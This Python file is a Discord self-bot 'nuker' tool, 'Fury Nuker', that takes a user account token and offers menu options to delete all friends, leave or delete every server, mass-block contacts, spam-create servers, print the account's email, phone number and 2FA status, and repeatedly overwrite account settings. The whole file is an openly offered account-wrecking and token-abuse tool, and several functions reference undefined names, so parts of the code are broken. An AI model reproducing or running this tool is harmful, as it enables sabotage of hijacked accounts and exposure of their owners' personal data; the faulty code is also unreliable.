# Importamos lo necesario
import discord
import asyncio
import threading
import requests
import discord
import random
import os
from discord.ext import commands
from discord.ext.commands import Bot
import pyfiglet
from pyfiglet import Figlet

# clear
def c():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")
c()

fi = Figlet(font="cosmike")
print(fi.renderText('Fury Nuker'))

token = input("Type the accoun token > ")
head = {'Authorization': str(token)}
rs = requests.get('https://discordapp.com/api/v6/users/@me', headers=head)

if rs.status_code == 200:
    print("Valid Accunt!")
    input("Press enter continue...")
else:
    print("Invalid Token!")
    input("Press enter to exit...")
    exit(0)




# Menu
def menu():
    c()
    print("""

    Dev: ϟ Renegade_ᶠˢ#7880

    GitHub: https://github.com/zStrike17

    [ 1 ]  -  Auto Nuker        [ 2 ]  -  Clear Friends
    [ 3 ]  -  Server Creator    [ 4 ]  -  Exit Servers
    [ 5 ]  -  Reomve Servers    [ 6 ]  -  Token Info
    [ 7 ]  -  Token Fucker      [ 8 ]  -  Mass Block


    """)
    op = input("Option: ")
    if op == "1":
        auto()
    elif op == "2":
        rf()
    elif op == "3":
        sc()
    elif op == "4":
        es()
    elif op == "5":
        cg()
    elif op == "6":
        tkif()
    elif op == "7":
        tkc()
    elif op == "8":
        blor()
    elif op == "9":
        print("Exiting...")
        exit(0)
    else:
        print("Chose a valid Option!")
        print("\n")
        input("Press enter to go back to the menu")
        menu()
# Bot

bot = commands.Bot(command_prefix='-', self_bot=True)
bot.remove_command("help")

# Borrar amigos

def rf():
    @bot.event
    async def on_ready():
        print("Removing friends...")
        for user in bot.user.friends:
            await user.remove_friend()
            print(f"{user} Was deleted successfully")
    print("Press enter to go back to the menu")
    menu()


# Salirse de Servers

def es():
    @bot.event
    async def on_ready():
        for guild in bot.guilds:
            try:
                await guild.leave()
                print(f"You have successfully exited the server: {guild.name}")
            except:
                print(f"Error exiting: {guild.name} | The owner of the token is the owner of the server")
                input("Press enter to return to the main menu")
                menu()

    bot.run(token, bot=False)
    menu()

# Bloquear a todos

def blor():
    @bot.event
    async def on_ready():
        for user in bot.user.friends:
            await user.block()
            print(f"{user} Blocked")
        input("Press enter to go back to the menu")
        menu()
    bot.run(token, bot=False)



# Creador de Servers
def sc():
    servers = input("How many servers do you want to create? > ")
    sname = input("Type the names of the servers > ")
    svicon = input("Type the url of the image (If you don't want image press enter) > ")
    @bot.event
    async def on_ready(servers):
        for x in range(servers):
            if svicon == "":
                await bot.create_guild(svname, region=None, icon=None)
                print("Creating servers...")
                print(f"{x} Servers")
        input("Press enter to go back to the menu")
        menu()
    bot.run(token, bot=False)


# Información de el Token

def tkif(token):
    print("Collecting Token Data...")
    he = {'Authorization': token, 'Content-Type': 'application/json'}
    u = requests.get('https://discord.com/api/v6/users/@me', headers=he)
    if r.status_code == 200:
        usN = u.json()["username"] + "#" + u.json()["discriminator"]
        usID = u.json()["id"]
        phone = u.json()["phone"]
        EM = u.json()["email"]
        mfa = u.json()["mfa_enabled"]
        print(f"""
        User ID:        {id}
        Username:       {usN}
        Email:          {EM}
        Phone Number:   {phone if phone else "No phone number"}
        2FA:            {mfa if mfa_enabled else "2FA Disabled"}
        Token:          {token}
        """)
        input("Press enter to go back to the menu")
        menu()

# Configuración de el token
def tkc(token):
    print("Fucking the Discord Token...")
    headers = {'Authorization': token}
    tm = cycle(["light", "dark"])
    for i in range (500):
        ss = {'theme': next(tm), 'locale': random.choice(["ja", "zh-TW", "ko", "zh-CN"])}
        requests.patch("https://discord.com/api/v6/users/@me/settings", headers=headers, json=ss)
    input("Press enter to go back to the menu")

# Borrador de Servers
def cg():
    @bot.event
    async def on_ready():
        for guild in bot.guilds:
            try:
                await guild.delete()
                print(f"{guild.name} Got deleted")
            except:
                print(f"FuryNuker can't delete {guild.name}")
        input("Press enter to go back to the menu")
        menu()
    bot.run(token, bot=False)
# Auto Nuker
def auto():
    try:
        rf()
        es()
        cg()
        blocker()
        sc()
        cg()
    except:
        print("An error has occurred")

menu()
